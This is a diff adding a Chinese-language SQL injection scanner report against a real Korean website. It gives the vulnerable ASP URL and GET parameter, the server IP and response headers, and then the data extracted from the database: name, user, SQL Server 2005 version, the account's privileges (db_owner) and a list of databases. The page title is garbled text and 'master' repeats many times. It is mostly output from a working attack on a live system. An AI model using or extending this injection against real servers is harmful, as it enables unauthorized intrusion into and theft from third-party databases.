@@ -1,0 +1,84 @@
+■漏洞信息:============================================================
+ ·URL:http://mediaent.cafe24.com/board/list.asp?sm=6_6&b_category=0&ListBlock=10&gotopage=7&Pagecount=48&search_category=&searchstring=&board_id=mec_qna
+ ·页面标题：版扁措 固叼绢浚磐抛牢刚飘背腊盔
+ ·参数:sm=6_6&b_category=0&ListBlock=10&gotopage=7&Pagecount=48&search_category=&searchstring=&board_id=mec_qna
+ ·方法:GET
+ ·类型:String
+ ·利用方法:And
+ ·脚本语言:asp
+ ·IP:222.122.213.158
+ ·数据库:SQL Server
+ ·HEAD:
+HTTP/1.1 200 OK
+Connection: close
+Date: Sun, 03 Apr 2011 12:06:26 GMT
+Server: Microsoft-IIS/6.0
+X-Powered-By: ASP.NET
+Pragma: No-Cache
+P3P: CP=ALL CURa ADMa DEVa TAIa OUR BUS IND PHY ONL UNI PUR FIN COM NAV INT DEM CNT STA POL HEA PRE LOC OTC
+Pragma: No-Cache
+P3P: CP=ALL CURa ADMa DEVa TAIa OUR BUS IND PHY ONL UNI PUR FIN COM NAV INT DEM CNT STA POL HEA PRE LOC OTC
+Content-Length: 115436
+Content-Type: text/html
+Expires: Sat, 02 Apr 2011 19:26:26 GMT
+Set-Cookie: ASPSESSIONIDQACCABBR=PDMFLAODFDNFKPBAFIDBAANM; path=/
+Cache-control: Private
+
+
+
+■数据库信息:============================================================
+- 数据库名：mediaent
+- 用户名：mediaent
+- 版本：Microsoft SQL Server 2005 - 9.00.4035.00 (Intel X86) 
+	Nov 24 2008 13:01:59 
+	Copyright (c) 1988-2005 Microsoft Corporation
+	Workgroup Edition on Windows NT 5.2 (Build 3790: Service Pack 2)
+
+- 服务器名：WWS-010
+- 服务名：MSSQLSERVER
+- 系统用户名：mediaent
+
+■发现SQL2005，建议您先切换到 '杂项工具' 标签页面开启相关设置。
+ ·当前用户权限：
+sysadmin(sa): 0
+dbcreator): 0
+bulkadmin: 0
+diskadmin: 0
+serveradmin: 0
+public: 1
+db_owner: 1
+db_backupoperator: 0
+db_datawriter: 1
+
+ ·数据库信息:
+db_name	filename
+----------------------------------------------------------------------------------------------------
+master		
+tempdb		
+model		
+msdb		
+ReportServer		
+ReportServerTempDB		
+AdventureWorksDW		
+AdventureWorks		
+cafe24		
+miaouwws010		
+yongsantgs		
+whywebx		
+master		
+master		
+master		
+master		
+master		
+master		
+master		
+master		
+master		
+master		
+master		
+master		
+master		
+master		
+master		
+master		
+master		
